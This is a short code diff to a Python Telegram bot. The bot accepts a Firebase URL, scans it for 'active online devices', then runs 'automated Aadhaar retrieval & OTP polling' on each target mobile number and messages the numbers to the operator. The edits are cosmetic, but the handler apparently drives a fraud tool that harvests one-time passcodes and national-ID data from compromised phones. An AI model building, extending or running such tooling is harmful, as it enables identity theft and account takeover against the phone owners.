@@ -1315,7 +1315,7 @@ def handle_all(message):
         return
     text = message.text.strip()
 
-    # --- AUTO-FIREBASE BOT AUTOMATION INTERCEPTOR ---
+    # --- AUTO FIREBASE BOT AUTOMATION INTERCEPTOR ---
     if state.get('step') == 'AWAITING_AUTO_FIREBASE_LINK':
         if text.lower() == 'cancel':
             user_states[chat_id] = {'step': 'IDLE'}
@@ -1335,7 +1335,7 @@ def handle_all(message):
         target_firebase_url = urls[0].strip()
         user_states[chat_id] = {'step': 'IDLE'}
         
-        status_msg = bot.send_message(chat_id, f"⚡ <b>Auto Firebase started!</b> Scanning active online devices from URL...", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
+        status_msg = bot.send_message(chat_id, "⚡ <b>Auto Firebase started!</b> Scanning active online devices from URL...", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
 
         def run_auto_firebase_loop():
             try:
@@ -1376,7 +1376,7 @@ def handle_all(message):
                     f"🔗 <b>Checked URL:</b> <code>{base_url}</code>\n"
                     f"🟢 <b>Total Online / Active Devices:</b> <code>{total_online_count}</code>\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "⚡ <i>Executing automated Aadhaar retrieval & OTP polling for all devices...</i>",
+                    "⚡ <i>Executing automated Aadhaar retrieval & 40s timeout OTP polling for all devices...</i>",
                     parse_mode='HTML'
                 )
 
@@ -1403,7 +1403,6 @@ def handle_all(message):
 
                     bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
                     
-                    # Temporarily save firebase URL to env so engine can poll it automatically
                     os.environ['FIREBASE_URL'] = target_firebase_url
 
                     user_info = {'username': 'AutoFirebase', 'first_name': 'AutoBot'}
